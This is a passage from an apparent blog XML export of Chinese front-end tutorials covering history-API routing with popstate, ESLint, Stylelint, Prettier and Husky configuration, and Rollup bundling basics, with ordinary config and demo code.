事件</h3><ul><li><p>每当同一个文档的浏览历史（即history）出现变化时，就会触发popState事件</p></li><li><p>需要注意：仅仅调用pushState方法或replaceState方法，并不会触发该事件，只有用户点击浏览器后退和前进按钮时，或者使用js调用back、forward、go方法时才会触发。另外该事件只针对同一个文档，如果浏览历史的切换，导致加载不同的文档，该事件不会被触发</p></li><li><p>使用的时候，可以为popState事件指定回调函数</p></li></ul><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">window</span>.onpopstate = <span class="function"><span class="keyword">function</span> (<span class="params">event</span>) </span>&#123;</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="string">'location: '</span> + <span class="built_in">document</span>.location);</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="string">'state: '</span> +<span class="built_in">JSON</span>.stringify(event.state));</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 或者</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">window</span>.addEventListener(<span class="string">'popstate'</span>, <span class="function"><span class="keyword">function</span>(<span class="params">event</span>) </span>&#123;</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="string">'location: '</span> + <span class="built_in">document</span>.location);</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="string">'state: '</span> + <span class="built_in">JSON</span>.stringify(event.state));</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>回调函数的参数是一个event事件对象，它的state属性指向pushState和replaceState方法为当前url所提供的状态对象（即这两个方法的第一个参数）。上边代码中的event.state就是通过pushState和replaceState方法为当前url绑定的state对象</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- popstate 和点击事件 触发页面改变 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">ul</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">li</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"/a"</span>&gt;</span>a<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">li</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"/b"</span>&gt;</span>b<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">li</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"/c"</span>&gt;</span>c<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">"view"</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="javascript">      <span class="keyword">var</span> view = <span class="literal">null</span>;</span></span><br><span class="line"><span class="javascript">      <span class="comment">// 页面加载完不会触发 hashchange</span></span></span><br><span class="line"><span class="javascript">      <span class="comment">// 这里主动触发一次 hashchange 事件,该事件快于onLoad,所以需要在这里操作</span></span></span><br><span class="line"><span class="javascript">      <span class="built_in">window</span>.addEventListener(<span class="string">'DOMContentLoaded'</span>, <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">        view = <span class="built_in">document</span>.querySelector(<span class="string">'#view'</span>);</span></span><br><span class="line"><span class="javascript">        <span class="built_in">document</span></span></span><br><span class="line"><span class="javascript">          .querySelectorAll(<span class="string">'a[href]'</span>)</span></span><br><span class="line"><span class="javascript">          .forEach(<span class="function"><span class="params">e</span> =&gt;</span> e.addEventListener(<span class="string">'click'</span>, <span class="function"><span class="keyword">function</span> (<span class="params">_e</span>) </span>&#123;</span></span><br><span class="line"><span class="undefined">            _e.preventDefault();</span></span><br><span class="line"><span class="javascript">            history.pushState(<span class="literal">null</span>, <span class="string">''</span>, e.getAttribute(<span class="string">'href'</span>));</span></span><br><span class="line"><span class="undefined">            viewChange();</span></span><br><span class="line"><span class="undefined">          &#125;));</span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="undefined">        viewChange();</span></span><br><span class="line"><span class="undefined">      &#125;);</span></span><br><span class="line"><span class="javascript">      <span class="comment">// 监听路由变化</span></span></span><br><span class="line"><span class="javascript">      <span class="built_in">window</span>.addEventListener(<span class="string">'popstate'</span>, viewChange);</span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="javascript">      <span class="comment">// 渲染视图</span></span></span><br><span class="line"><span class="javascript">      <span class="function"><span class="keyword">function</span> <span class="title">viewChange</span>(<span class="params"></span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">        <span class="keyword">switch</span> (location.pathname) &#123;</span></span><br><span class="line"><span class="javascript">          <span class="keyword">case</span> <span class="string">'/b'</span>:</span></span><br><span class="line"><span class="javascript">            view.innerHTML = <span class="string">'b'</span>;</span></span><br><span class="line"><span class="javascript">            <span class="keyword">break</span>;</span></span><br><span class="line"><span class="javascript">          <span class="keyword">case</span> <span class="string">'/c'</span>:</span></span><br><span class="line"><span class="javascript">            view.innerHTML = <span class="string">'c'</span>;</span></span><br><span class="line"><span class="javascript">            <span class="keyword">break</span>;</span></span><br><span class="line"><span class="javascript">          <span class="keyword">default</span>:</span></span><br><span class="line"><span class="javascript">            view.innerHTML = <span class="string">'a'</span>;</span></span><br><span class="line"><span class="javascript">            <span class="keyword">break</span>;</span></span><br><span class="line"><span class="undefined">        &#125;</span></span><br><span class="line"><span class="undefined">      &#125;</span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 前端路由 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>规范化标准ESLint</title>
      <link href="2020/09/10/%E6%95%B4%E7%90%86-%E8%A7%84%E8%8C%83%E5%8C%96%E6%A0%87%E5%87%86ESLint/"/>
      <url>2020/09/10/%E6%95%B4%E7%90%86-%E8%A7%84%E8%8C%83%E5%8C%96%E6%A0%87%E5%87%86ESLint/</url>
      
        <content type="html"><![CDATA[<ul><li>ESLint 安装与配置</li><li>配置注释</li><li>ESLint 结合自动化工具</li><li>Stylelint</li><li>Prettier </li><li>Git Hooks</li></ul><a id="more"></a><h2 id="ESLint-安装与配置"><a href="#ESLint-安装与配置" class="headerlink" title="ESLint 安装与配置"></a>ESLint 安装与配置</h2><p>安装：<code>npm init --yes</code>，<code>npm intall eslint --save-dev</code></p><p>配置：<code>eslint --init</code>，此时会有一些问题，按需回答即可，一般选用 Standard 规范，安装一些依赖之后</p><p>使用<code>eslint foo.js</code>检查目标文件即可</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// .eslintrc.js</span></span><br><span class="line"><span class="built_in">module</span>.exports = &#123;</span><br><span class="line">  env: &#123;</span><br><span class="line">    browser: <span class="literal">true</span>, <span class="comment">// 运行环境 browser/node/commonjs等，可以同时使用</span></span><br><span class="line">    es6: <span class="literal">false</span></span><br><span class="line">  &#125;,</span><br><span class="line">  extends: [ <span class="comment">// 继承公共配置</span></span><br><span class="line">    <span class="string">'standard'</span></span><br><span class="line">  ],</span><br><span class="line">  parserOptions: &#123; <span class="comment">// 语法解析器，只是检测语法，env中的 es6 设置了 false，还是不可用</span></span><br><span class="line">    ecmaVersion: <span class="number">2015</span></span><br><span class="line">  &#125;,</span><br><span class="line">  rules: &#123; <span class="comment">// 校验规则</span></span><br><span class="line">    <span class="string">'no-alert'</span>: <span class="string">"error"</span> <span class="comment">// 有 off/warn/error 选项</span></span><br><span class="line">  &#125;,</span><br><span class="line">  globals: &#123; <span class="comment">// 声明可以使用的全局成员</span></span><br><span class="line">    <span class="string">"jQuery"</span>: <span class="string">"readonly"</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="配置注释"><a href="#配置注释" class="headerlink" title="配置注释"></a>配置注释</h2><blockquote><p>standard 标准不支持 模板字符串语法，但是在项目中某一行我还是想用一下怎么办，可以通过配置注释</p><p>禁用规则：no-template-curly-in-string</p></blockquote><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> str1 = <span class="string">'$&#123;name&#125; is a coder'</span> <span class="comment">// eslint-disable-line no-template-curly-in-string</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">console</span>.log(str1)</span><br></pre></td></tr></table></figure><h2 id="ESLint-结合自动化工具"><a href="#ESLint-结合自动化工具" class="headerlink" title="ESLint 结合自动化工具"></a>ESLint 结合自动化工具</h2><h4 id="ESLint-结合-gulp"><a href="#ESLint-结合-gulp" class="headerlink" title="ESLint 结合 gulp"></a>ESLint 结合 gulp</h4><p>在已经配置好 gulp 的项目中安装<code>gulp-eslint</code>：<code>yarn add gulp-eslint --save-dev</code></p><p>初始化<code>.eslintrc.js</code>配置文件</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// gulpfile.js</span></span><br><span class="line"><span class="keyword">const</span> script = <span class="function"><span class="params">()</span> =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">return</span> src(<span class="string">'src/assets/scripts/*.js'</span>, &#123; <span class="attr">base</span>: <span class="string">'src'</span> &#125;)</span><br><span class="line">    .pipe(plugins.eslint()) <span class="comment">// 如果只加入这一行只会检查错误，而不会抛出错误</span></span><br><span class="line">    .pipe(plugins.eslint.format())</span><br><span class="line">    .pipe(plugins.eslint.failAfterError())</span><br><span class="line">    .pipe(plugins.babel(&#123; <span class="attr">presets</span>: [<span class="string">'@babel/preset-env'</span>] &#125;))</span><br><span class="line">    .pipe(dest(<span class="string">'temp'</span>))</span><br><span class="line">    .pipe(bs.reload(&#123; <span class="attr">stream</span>: <span class="literal">true</span> &#125;))</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="ESLint-结合-webpack"><a href="#ESLint-结合-webpack" class="headerlink" title="ESLint 结合 webpack"></a>ESLint 结合 webpack</h4><p>安装<code>eslint-loader</code>，初始化<code>.eslintrc.js</code>配置文件</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// webpack.config.js</span></span><br><span class="line"><span class="keyword">const</span> HtmlWebpackPlugin = <span class="built_in">require</span>(<span class="string">'html-webpack-plugin'</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">module</span>.exports = &#123;</span><br><span class="line">  mode: <span class="string">'production'</span>,</span><br><span class="line">  entry: <span class="string">'./src/main.js'</span>,</span><br><span class="line">  <span class="built_in">module</span>: &#123;</span><br><span class="line">    rules: [</span><br><span class="line">      &#123;</span><br><span class="line">        test: <span class="regexp">/\.js$/</span>, </span><br><span class="line">        exclude: <span class="regexp">/node_modules/</span>, </span><br><span class="line">        use: <span class="string">'babel-loader'</span></span><br><span class="line">      &#125;,</span><br><span class="line">      &#123;</span><br><span class="line">        test: <span class="regexp">/\.js$/</span>, </span><br><span class="line">        exclude: <span class="regexp">/node_modules/</span>, </span><br><span class="line">        use: <span class="string">'eslint-loader'</span>,</span><br><span class="line">        enfore: <span class="string">'pre'</span> <span class="comment">// 优先级最高</span></span><br><span class="line">      &#125;,</span><br><span class="line">      &#123;</span><br><span class="line">        test: <span class="regexp">/\.css$/</span>, </span><br><span class="line">        use: [</span><br><span class="line">          <span class="string">'style-loader'</span>,</span><br><span class="line">          <span class="string">'css-loader'</span></span><br><span class="line">        ]</span><br><span class="line">      &#125;</span><br><span class="line">    ]</span><br><span class="line">  &#125;,</span><br><span class="line">  plugins: [</span><br><span class="line">    <span class="keyword">new</span> HtmlWebpackPlugin(&#123;</span><br><span class="line">      template: <span class="string">'src/index.html'</span></span><br><span class="line">    &#125;)</span><br><span class="line">  ]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>vue-cli 在安装过程中有选项会自动集成 eslint 配置</p></blockquote><h3 id="eslint-检查-TypeScript"><a href="#eslint-检查-TypeScript" class="headerlink" title="eslint 检查 TypeScript"></a>eslint 检查 TypeScript</h3><ul><li>eslint 初始化时选择 TypeScript</li></ul><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// .eslintrc.js</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">module</span>.exports = &#123;</span><br><span class="line">  env: &#123;</span><br><span class="line">    browser: <span class="literal">true</span>,</span><br><span class="line">    es2020: <span class="literal">true</span></span><br><span class="line">  &#125;,</span><br><span class="line">  extends: [</span><br><span class="line">    <span class="string">'standard'</span></span><br><span class="line">  ],</span><br><span class="line">  parser: <span class="string">'@typescript-eslint/parser'</span>,</span><br><span class="line">  parserOptions: &#123;</span><br><span class="line">    ecmaVersion: <span class="number">11</span></span><br><span class="line">  &#125;,</span><br><span class="line">  plugins: [</span><br><span class="line">    <span class="string">'@typescript-eslint'</span></span><br><span class="line">  ],</span><br><span class="line">  rules: &#123;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="Stylelint"><a href="#Stylelint" class="headerlink" title="Stylelint"></a>Stylelint</h2><ul><li>提供默认的代码检查规则</li><li>提供CLI工具，快速调用</li><li>通过插件支持Sass，Less，PostCSS</li><li>支持 Gulp 或 Webpack 集成</li></ul><p>安装 stylelint ：<code>yarn add stylelint -D</code></p><p>安装配置模块：<code>stylelint-config-standard</code></p><p>sass配置模块：<code>stylelint-config-sass-guidelines</code></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// .stylelintrc.js</span></span><br><span class="line">modules.exports = &#123;</span><br><span class="line">    extends: [<span class="string">"stylelint-config-standard"</span>, <span class="string">"stylelint-config-sass-guidelines"</span>]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>执行检查：<code>stylelint ./index.sass</code></p><h2 id="Prettier"><a href="#Prettier" class="headerlink" title="Prettier"></a>Prettier</h2><p>安装：<code>yarn add prettier -D</code></p><p>运行：<code>prettier style.css --write</code>可以自动将格式化后的文件覆盖源文件</p><h2 id="Git-Hooks"><a href="#Git-Hooks" class="headerlink" title="Git Hooks"></a>Git Hooks</h2><ul><li>Git Hooks也称之为 git 钩子，每个钩子都对应一个任务（commit/push）</li><li>通过 shell 脚本可以编写钩子任务触发时要具体执行的操作</li></ul><p><code>.git/hooks/pre-commit.sample</code>为<code>commit</code>之前的钩子函数，可以新建一个<code>pre-commit</code>文件写一些操作</p><p><code>Husky</code>可以实现<code>Git Hooks</code>的使用需求</p><p> 安装：<code>yarn add Husky -D</code></p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">// 在package.json中配置</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">    <span class="attr">"husky"</span>: &#123;</span><br><span class="line">        <span class="attr">"hooks"</span>: &#123;</span><br><span class="line">            <span class="attr">"pre-commit"</span>: <span class="string">"eslint ./index.js"</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;   </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>此外还有<code>lint-staged</code>模块等</p>]]></content>
      
      
      <categories>
          
          <category> 前端工程化 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Rollup</title>
      <link href="2020/09/10/%E6%95%B4%E7%90%86-Rollup/"/>
      <url>2020/09/10/%E6%95%B4%E7%90%86-Rollup/</url>
      
        <content type="html"><![CDATA[<ul><li>Rollup快速上手</li><li>Rollup配置文件 </li><li>Rollup使用插件</li><li>代码拆分多入口打包</li><li>优缺点</li></ul><a id="more"></a><h2 id="Rollup快速上手"><a href="#Rollup快速上手" class="headerlink" title="Rollup快速上手"></a>Rollup快速上手</h2><p>举例：src 目录下有如下三个文件</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// messages.js</span></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> &#123;</span><br><span class="line">  hi: <span class="string">'Hey Guys, I am zce~'</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// logger.js</span></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">const</span> log = <span class="function"><span class="params">msg</span> =&gt;</span> &#123;</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="string">'---------- INFO ----------'</span>)</span><br><span class="line">  <span class="built_in">console</span>.log(msg)</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="string">'--------------------------'</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">const</span> error = <span class="function"><span class="params">msg</span> =&gt;</span> &#123;</span><br><span class="line">  <span class="built_in">console</span>.error(<span class="string">'---------- ERROR ----------'</span>)</span><br><span class="line">  <span class="built_in">console</span>.error(msg)</span><br><span class="line">  <span class="built_in">console</span>.error(<span class="string">'---------------------------'</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// index.js</span></span><br><span class="line"><span class="comment">// 导入模块成员</span></span><br><span class="line"><span class="keyword">import</span> &#123; log &#125; <span class="keyword">from</span> <span class="string">'./logger'</span></span><br><span class="line"><span class="keyword">import</span> messages <span class="keyword">from</span> <span class="string">'./messages'</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 使用模块成员</span></span><br><span class="line"><span class="keyword">const</span> msg = messages.hi</span><br><span class="line"></span><br><span class="line">log(msg)</span><br></pre></td></tr></table></figure><p>安装 Rollup：<code>yarn add rollup --dev</code></p><p>执行打包命令：<code>yarn rollup ./src/index.js --format iife --file dist/bundle.js</code></p><p>Rollup会自动执行<code>tree shaking</code>，去除无效代码</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// bundle.js</span></span><br><span class="line">(<span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line"><span class="meta">  'use strict'</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">const</span> log = <span class="function"><span class="params">msg</span> =&gt;</span> &#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">'---------- INFO ----------'</span>);</span><br><span class="line">    <span class="built_in">console</span>.log(msg);</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">'--------------------------'</span>);</span><br><span class="line">  &#125;;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">var</span> messages = &#123;</span><br><span class="line">    hi: <span class="string">'Hey Guys, I am zce~'</span></span><br><span class="line">  &#125;;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 导入模块成员</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">// 使用模块成员</span></span><br><span class="line">  <span class="keyword">const</span> msg = messages.hi;</span><br><span class="line"></span><br><span class="line">  log(msg);</span><br><span class="line"></span><br><span class="line">&#125;());</span><br></pre></td></tr></table></figure><h2 id="rollup配置文件"><a href="#rollup配置文件" class="headerlink" title="rollup配置文件"></a>rollup配置文件</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// rollup.config.js</span></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> &#123;</span><br><span class="line">  input: <span class="string">'src/index.js'</span>,   <span class="comment">// 入口</span></span><br><span class="line">  output: &#123;</span><br><span class="line">    file: <span class="string">'dist/bundle.js'</span>,</span><br><span class="line">    format: <span class="string">'iife'</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>运行命令：<code>yarn rollup --config rollup.config.js</code></p><h2 id="Rollup使用插件"><a href="#Rollup使用插件" class="headerlink" title="Rollup使用插件"></a>Rollup使用插件</h2><p>安装可以导入 json 的插件：<code>yarn add rollup-plugin-json --dev</code></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> json <span class="keyword">from</span> <span class="string">'rollup-plugin-json'</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> &#123;</span><br><span class="line">  input: <span class="string">'src/index.js'</span>,</span><br><span class="line">  output: &#123;</span><br><span class="line">    file: <span class="string">'dist/bundle.js'</span>,</span><br><span class="line">    format: <span class="string">'iife'</span></span><br><span class="line">  &#125;,</span><br><span class="line">  plugins: [</span><br><span class="line">    json()  <span class="comment">// 调用的结果</span></span><br><span class="line">  ]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="Rollup-加载-node-modules-中的-NPM-模块"><a href="#Rollup-加载-node-modules-中的-NPM-模块" class="headerlink" title="Rollup 加载 node_modules 中的 NPM 模块"></a>Rollup 加载 node_modules 中的 NPM 模块</h3><p><code>yarn add rollup-plugin-node-resolve --dev</code>，配置同上</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// index.js</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 导入模块成员</span></span><br><span class="line"><span class="keyword">import</span> _ <span class="keyword">from</span> <span class="string">'lodash-es'</span></span><br><span class="line"><span class="keyword">import</span> &#123; log &#125; <span class="keyword">from</span> <span class="string">'./logger'</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 使用模块成员</span></span><br><span class="line">log(_.camelCase(<span class="string">'hello world'</span>))</span><br></pre></td></tr></table></figure><blockquote><p>Rollup 默认只能使用 ES Modules模块，所以要导入 lodash-es，不能导入原本的 lodash</p></blockquote><h3 id="Rollup-加载-CommonJS"><a href="#Rollup-加载-CommonJS" class="headerlink" title="Rollup 加载 CommonJS"></a>Rollup 加载 CommonJS</h3><blockquote><p>因为依旧很多第三方模块使用 ComminJS 规范，所以需要插件处理</p></blockquote><p><code>yarn add rollup-plugin-commonjs --dev</code></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 自己写一个 CommonJS 规范的模块 cjs-module.js</span></span><br><span class="line"><span class="built_in">module</span>.exports = &#123;</span><br><span class="line">  foo: <span class="string">'bar'</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// index.js</span></span><br><span class="line"><span class="keyword">import</span> cjs <span class="keyword">from</span> <span class="string">'./cjs-module'</span></span><br></pre></td></tr></table></figure><h2 id="代码拆分"><a href="#代码拆分" class="headerlink" title="代码拆分"></a>代码拆分</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 动态导入</span></span><br><span class="line"><span class="keyword">import</span>(<span class="string">'./logger'</span>).then(<span class="function">(<span class="params">&#123; log &#125;</span>) =&gt;</span> &#123; <span class="comment">// import('./logger')返回promise，解构提取log方法</span></span><br><span class="line">  log(<span class="string">'code splitting~'</span>)</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><blockquote><p>使用代码拆分不能用 iife 格式，应该使用 AMD 或者 CommonJS 规范，而在浏览器端只能使用 AMD 规范</p></blockquote><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> &#123;</span><br><span class="line">  input: <span class="string">'src/index.js'</span>,</span><br><span class="line">  output: &#123;</span><br><span class="line">    dir: <span class="string">'dist'</span>, <span class="comment">// 多个文件，使用 dir</span></span><br><span class="line">    format: <span class="string">'amd'</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="多入口打包"><a href="#多入口打包" class="headerlink" title="多入口打包"></a>多入口打包</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span 